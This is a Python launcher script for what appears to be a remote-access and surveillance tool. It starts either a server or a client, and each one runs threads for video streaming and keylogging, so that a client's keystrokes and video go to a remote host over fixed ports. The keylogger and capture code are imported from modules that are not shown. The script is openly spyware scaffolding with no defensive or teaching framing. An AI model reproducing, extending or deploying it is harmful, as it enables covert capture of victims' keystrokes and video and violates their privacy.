import argparse
import threading
from server.server import Server
from client.client import Client
from server.handlers import start_video_stream_server, start_keylogger_server
from client.features import start_video_stream_client, start_keylogger_client

def main():
    parser = argparse.ArgumentParser(description="Start the client or server.")
    parser.add_argument('role', choices=['server', 'client'], help="Role to start ('server' or 'client')")
    parser.add_argument('--host', default='127.0.0.1', help="Host to connect/bind to")
    parser.add_argument('--port', type=int, default=5555, help="Port to connect/bind to")
    parser.add_argument('--video_port', type=int, default=9999, help="Port for video streaming")
    parser.add_argument('--keylogger_port', type=int, default=9998, help="Port for keylogging")

    args = parser.parse_args()

    if args.role == 'server':
        server = Server(host=args.host, port=args.port)
        video_thread = threading.Thread(target=start_video_stream_server, args=(args.host, args.video_port))
        keylogger_thread = threading.Thread(target=start_keylogger_server, args=(args.host, args.keylogger_port))
        video_thread.start()
        keylogger_thread.start()
        server.start()
    elif args.role == 'client':
        client = Client(host=args.host, port=args.port)
        video_thread = threading.Thread(target=start_video_stream_client, args=(args.host, args.video_port))
        keylogger_thread = threading.Thread(target=start_keylogger_client, args=(args.host, args.keylogger_port))
        video_thread.start()
        keylogger_thread.start()
        client.start()

if __name__ == "__main__":
    main()
